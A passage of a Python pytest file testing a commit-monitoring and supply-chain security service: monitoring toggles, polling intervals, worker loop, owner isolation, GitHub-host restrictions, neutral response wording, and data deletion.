    response = client.post(url(created, "/commits/monitoring"), headers=auth_headers, json={"enabled": True})
    assert response.status_code == 200 and response.json()["monitoring"]["enabled"] is True
    assert "switched off on this installation" in response.json()["monitoring"]["note"]
    assert db["audit_logs"].find_one({"action": "commits.monitoring.set"})["details"] == {"enabled": True}
    assert client.post(url(created, "/commits/monitoring"), headers=auth_headers, json={"enabled": False}).json()["monitoring"]["enabled"] is False
    for body in ({}, {"enabled": "maybe"}, {"enabled": True, "webhook": "https://example.net"}):
        assert client.post(url(created, "/commits/monitoring"), headers=auth_headers, json=body).status_code == 422


def test_polling_is_off_by_default(client, app, auth_headers, created, db):
    client.post(url(created, "/commits/monitoring"), headers=auth_headers, json={"enabled": True})
    assert behaviour.poll_due(db, app.state.redis, app.state.settings) == 0 and db["analysis_jobs"].count_documents({}) == 0


def test_polling_queues_due_projects_once_per_interval(client, auth_headers, created, repo, mongo, fake_redis, github, osv, registry):
    from fastapi.testclient import TestClient

    polled = make_app({"COMMIT_POLL_INTERVAL_MINUTES": "30"}, mongo, fake_redis, github, osv, registry)
    polled.state.github.sleep = lambda _s: None
    with TestClient(polled) as other:
        db = polled.state.db
        assert behaviour.poll_due(db, fake_redis, polled.state.settings) == 0                 # monitoring is not enabled for the project
        state = other.post(url(created, "/commits/monitoring"), headers=auth_headers, json={"enabled": True}).json()["monitoring"]
        assert state["polling_active"] is True and state["interval_minutes"] == 30
        assert behaviour.poll_due(db, fake_redis, polled.state.settings) == 1
        assert behaviour.poll_due(db, fake_redis, polled.state.settings) == 0                 # a job is already queued
        assert run_worker(polled) == 1
        job = other.get(url(created, "/jobs"), headers=auth_headers).json()["items"][0]
        assert job["type"] == jobs.COMMIT_BEHAVIOUR_ANALYSIS and job["state"] == "completed" and job["summary"]["trigger"] == "poll"
        assert behaviour.poll_due(db, fake_redis, polled.state.settings) == 0                 # checked a moment ago
        later = datetime.now(timezone.utc) + timedelta(minutes=31)     # from the real clock: NOW is fixed when the module is imported
        assert behaviour.poll_due(db, fake_redis, polled.state.settings, now=later) == 1
        assert db["audit_logs"].count_documents({"action": "job.commit_behaviour_analysis.finish"}) == 1


def test_the_worker_loop_polls(mongo, fake_redis, github, osv, registry, created, client, auth_headers):
    import threading

    from app.workers import worker

    polled = make_app({"COMMIT_POLL_INTERVAL_MINUTES": "1"}, mongo, fake_redis, github, osv, registry)
    polled.state.github.sleep = lambda _s: None
    db = mongo[polled.state.settings.mongodb_db]
    db["projects"].update_one({}, {"$set": {"commit_monitoring": {"enabled": True, "last_checked_at": None}}})
    stop = threading.Event()
    original = worker.wait_for_work
    worker.wait_for_work = lambda *_a: stop.set()
    try:
        worker.run(polled.state.settings, fake_redis, db, polled.state.github, stop, polled.state.providers, polled.state.registries)
    finally:
        worker.wait_for_work = original
    assert db[COMMIT_ANALYSIS].count_documents({}) == 12


def test_owner_isolation_and_authentication(client, auth_headers, other_headers, watched):
    paths = (("post", "/commits/analyze"), ("post", "/commits/monitoring"), ("get", "/commits"), ("get", f"/commits/{sha_of(0)}"),
             ("get", "/security-events"), ("get", "/behaviour-events"))
    for method, path in paths:
        extra = {"json": {"enabled": True}} if path.endswith("monitoring") else {}
        assert getattr(client, method)(url(watched, path), headers=other_headers, **extra).status_code == 404
        assert getattr(client, method)(url(watched, path), **extra).status_code == 401


def test_only_the_configured_github_host_is_contacted_and_no_blob_is_fetched(client, auth_headers, watched, github):
    assert all(request.url.host == "api.github.com" and request.method == "GET" for request in github.requests)
    assert not any("/git/blobs/" in request.url.path or "/git/trees/" in request.url.path for request in github.requests)


def test_responses_never_call_a_commit_or_its_author_harmful(client, auth_headers, watched):
    text = (client.get(url(watched, "/commits"), headers=auth_headers).text + client.get(url(watched, "/security-events"), headers=auth_headers).text
            + client.get(url(watched, f"/commits/{sha_of(0)}"), headers=auth_headers).text).lower()
    assert not any(word in text for word in FORBIDDEN)


def test_maintainer_analysis_uses_the_commit_findings(client, app, auth_headers, watched):
    assert start(client, app, auth_headers, watched, "/maintainers/analyze")["state"] == "completed"
    profile = get(client, auth_headers, watched, "/maintainers")["profile"]
    sensitive = next(item for item in profile["anomaly_indicators"] if item["type"] == "SECURITY_SENSITIVE_CHANGE")
    assert sensitive["status"] == "OBSERVED" and sensitive["evidence"]["analysed_commits"] == 12 and profile["change_patterns"]["dependency_changes"] == 1


def test_deleting_the_project_removes_its_commit_data(client, auth_headers, watched, db):
    assert client.delete(f"/api/projects/{watched['id']}", headers=auth_headers).status_code == 204
    for collection in (COMMIT_ANALYSIS, BEHAVIOUR_EVENTS, SECURITY_EVENTS):
        assert db[collection].count_documents({}) == 0
